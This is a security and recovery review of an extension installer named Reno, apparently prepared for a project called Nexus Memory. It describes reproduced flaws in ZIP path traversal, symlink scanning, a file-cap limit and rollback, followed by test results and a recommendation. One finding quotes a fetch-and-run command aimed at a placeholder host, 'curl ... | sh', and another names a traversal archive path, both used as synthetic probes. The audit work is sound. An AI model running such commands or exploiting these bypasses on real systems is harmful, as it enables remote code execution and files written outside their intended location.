## Security and recovery review (synthetic data only, isolated in temporary directories)
The project presents itself as a safe extension installer, but source-level checks and synthetic probes exposed important fail-open boundaries. No payload was executed and no user directory was touched.

1. ZIP path traversal: src/reno/downloader.py::_extract_zip removes the first archive component, joins the remaining member path to extract_to, and writes it without a canonical containment check. A synthetic archive member repo-main/../escaped.txt returned success and wrote escaped.txt outside the extraction subtree, within the disposable temp root.
2. Symlink bypass: scan_directory walks Path.rglob without traversing a directory symlink; BaseAdapter.copy_skill_files then shutil.copytree's the link with default symlink dereferencing. A synthetic Skill plus an assets symlink to an external temp folder scanned as risk=low, one text file scanned, no findings, and then copied the linked payload.sh into the install-copy directory. This demonstrates unscanned content can pass the low-risk gate; it does not demonstrate that the script ran.
3. File-cap fail-open: when the synthetic Skill had 651 enumerated entries, with a curl https://example.invalid/script.sh | sh payload at list index 650, the scanner scanned 500 entries, returned risk=low and only a low-severity too_many_files finding; 151 entries were skipped. The file cap should fail closed or scan a deterministic manifest rather than silently allow auto-install.
4. Nested rollback data loss: _backup_dir backs up only top-level regular files and _restore_backup restores only top-level regular files. A synthetic update/rollback preserved top.txt but lost the original nested/keep.txt. The repository test search found only a general adapter-failure rollback test, not traversal, symlink, file-cap, or nested-tree rollback coverage.
5. Additional design concerns from source: GitHub archive extraction has no path containment or archive-size cap; fetch metadata does not pin a source commit or record an archive digest. Static text-pattern scanning is not a semantic Skill-prompt safety validator. These are code-review observations, not separate exploit claims.

## Local test execution and platform boundary
- rtk pytest tests/ first failed to spawn pytest (exit 1); the host environment had no pytest. rtk proxy python3 -m pytest tests/ then reported No module named pytest (exit 1). A disposable /tmp/nm-reno-test-20261122 venv was created; pip install -e '.[dev]' succeeded.
- Native macOS/POSIX run of rtk proxy /tmp/nm-reno-test-20261122/bin/python -m pytest tests/ exited 1: 472 passed, 23 failed in 6.27s. Failures are in installer/remover/syncer tests that expect Windows %USERPROFILE% expansion; POSIX os.path.expandvars leaves that Windows form literal. The first unshimmed run wrote only test-generated literal %USERPROFILE%/... fixtures under the disposable source checkout; that exact untracked tree was removed, then the checkout was verified clean.
- For the Windows-first project's intended variable semantics, the same complete suite was rerun with a process-local %NAME% expansion shim and USERPROFILE=/tmp/nm-reno-test-global-home: 495 passed in 5.69s, exit 0. No source files were changed; after the shim run rtk git status --short --untracked-files=all was empty. This compatibility shim is a test harness accommodation, not a claim that the candidate natively passes unchanged on macOS.
- Existing tests do not cover the four reproduced security/recovery cases above; passing unit tests should not be read as validation of those boundaries.

## Recommendation for Nexus Memory
Do not adopt Reno as a dependency, session importer, fidelity reference, or safe-install implementation. It is an adjacent Skills/resource manager only. At most, independently borrow the product separation idea of a local resource inventory while requiring archive containment, bounded extraction, symlink-aware scanning/copy rules, deterministic complete scans, commit/digest provenance, and tree-preserving atomic rollback. Keep Skills/MCP/plugins in their own resource planes; none of these project/session features is implemented here.
